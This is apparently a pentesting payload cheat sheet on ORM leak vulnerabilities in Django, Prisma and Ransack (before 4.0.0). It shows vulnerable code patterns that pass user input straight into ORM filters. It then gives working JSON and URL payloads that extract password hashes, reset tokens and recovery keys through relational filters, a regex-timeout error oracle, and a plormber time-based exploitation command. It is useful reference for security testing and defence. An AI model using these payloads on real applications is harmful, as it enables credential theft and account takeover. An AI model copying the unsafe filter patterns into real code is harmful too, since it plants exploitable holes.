# orm leak

> an orm leak vulnerability occurs when sensitive information, such as database structure or user data, is unintentionally exposed due to improper handling of orm queries. this can happen if the application returns raw error messages, debug information, or allows attackers to manipulate queries in ways that reveal underlying data.


## summary

* [django (python)](#django-python)
    * [query filter](#query-filter)
    * [relational filtering](#relational-filtering)
        * [one-to-one](#one-to-one)
        * [many-to-many](#many-to-many)
    * [error-based leaking - redos](#error-based-leaking---redos)
* [prisma (node.js)](#prisma-nodejs)
    * [relational filtering](#relational-filtering-1)
        * [one-to-one](#one-to-one-1)
        * [many-to-many](#many-to-many-1)
* [ransack (ruby)](#ransack-ruby)
* [cve](#cve)
* [references](#references)


## django (python)

the following code is a basic example of an orm querying the database.

```py
users = user.objects.filter(**request.data)
serializer = userserializer(users, many=true)
```

the problem lies in how the django orm uses keyword parameter syntax to build querysets. by utilizing the unpack operator (`**`), users can dynamically control the keyword arguments passed to the filter method, allowing them to filter results according to their needs.


### query filter

the attacker can control the column to filter results by. 
the orm provides operators for matching parts of a value. these operators can utilize the sql like condition in generated queries, perform regex matching based on user-controlled patterns, or apply comparison operators such as < and >.


```json
{
    "username": "admin",
    "password__startswith": "p"
}
```

interesting filter to use:

* `__startswith`
* `__contains`
* `__regex`


### relational filtering

let's use this great example from [plormbing your django orm, by alex brown](https://www.elttam.com/blog/plormbing-your-django-orm/)

[image extracted text: [image not found]]


we can see 2 type of relationships:

* one-to-one relationships
* many-to-many relationships


#### one-to-one

filtering through user that created an article, and having a password containing the character `p`.

```json
{
    "created_by__user__password__contains": "p"
}
```


#### many-to-many

almost the same thing but you need to filter more.

* get the user ids: `created_by__departments__employees__user__id`
* for each id, get the username: `created_by__departments__employees__user__username` 
* finally, leak their password hash: `created_by__departments__employees__user__password`

use multiple filters in the same request:

```json
{
    "created_by__departments__employees__user__username__startswith": "p",
    "created_by__departments__employees__user__id": 1
}
```


### error-based leaking - redos

if django use mysql, you can also abuse a redos to force an error when the filter does not properly match the condition.

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => return something

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => error 500 (timeout exceeded in regular expression match)
```


## prisma (node.js)

**tools**:

* [elttam/plormber](https://github.com/elttam/plormber) - tool for exploiting orm leak time-based vulnerabilities
    ```ps1
    plormber prisma-contains \
        --chars '0123456789abcdef' \
        --base-query-json '{"query": {payload}}' \
        --leak-query-json '{"createdby": {"resettoken": {"startswith": "{orm_leak}"}}}' \
        --contains-payload-json '{"body": {"contains": "{random_string}"}}' \
        --verbose-stats \
        https://some.vuln.app/articles/time-based;
    ```

**example**:

example of an orm leak in node.js with prisma.

```js
const posts = await prisma.article.findmany({
    where: req.query.filter as any // vulnerable to orm leaks
})
```

use the include to return all the fields of user records that have created an article

```json
{
    "filter": {
        "include": {
            "createdby": true
        }
    }
}
```

select only one field

```json
{
    "filter": {
        "select": {
            "createdby": {
                "select": {
                    "password": true
                }
            }
        }
    }
}
```


### relational filtering

#### one-to-one

* [`filter[createdby][resettoken][startswith]=06`](http://127.0.0.1:9900/articles?filter[createdby][resettoken][startswith]=)

#### many-to-many

```json
{
    "query": {
        "createdby": {
            "departments": {
                "some": {
                    "employees": {
                        "some": {
                            "departments": {
                                "some": {
                                    "employees": {
                                        "some": {
                                            "departments": {
                                                "some": {
                                                    "employees": {
                                                        "some": {
                                                            "{fieldtoleak}": {
                                                                "startswith": "{teststartswith}"
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```


## ransack (ruby)

only in ransack < `4.0.0`.


[image extracted text: [image not found]]


* extracting the `reset_password_token` field of a user
    ```ps1
    get /posts?q[user_reset_password_token_start]=0 -> empty results page
    get /posts?q[user_reset_password_token_start]=1 -> empty results page
    get /posts?q[user_reset_password_token_start]=2 -> results in page

    get /posts?q[user_reset_password_token_start]=2c -> empty results page
    get /posts?q[user_reset_password_token_start]=2f -> results in page
    ```

* target a specific user and extract his `recoveries_key`
    ```ps1
    get /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
    ```


## cve

* [cve-2023-47117: label studio orm leak](https://github.com/humansignal/label-studio/security/advisories/ghsa-6hjj-gq77-j4qw)
* [cve-2023-31133: ghost cms orm leak](https://github.com/tryghost/ghost/security/advisories/ghsa-r97q-ghch-82j9)
* [cve-2023-30843: payload cms orm leak](https://github.com/payloadcms/payload/security/advisories/ghsa-35jj-vqcf-f2jf)


## references

- [orm injection - hacktricks - july 30, 2024](https://book.hacktricks.xyz/pentesting-web/orm-injection)
- [orm leak exploitation against sqlite - louis nyffenegger - july 30, 2024](https://pentesterlab.com/blog/orm-leak-with-sqlite3)
- [plormbing your django orm - alex brown - june 24, 2024](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [plormbing your prisma orm with time-based attacks - alex brown - july 9, 2024](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [queryset api reference - django - august 8, 2024](https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
- [ransacking your password reset tokens - lukas euler - january 26, 2023](https://positive.security/blog/ransack-data-exfiltration)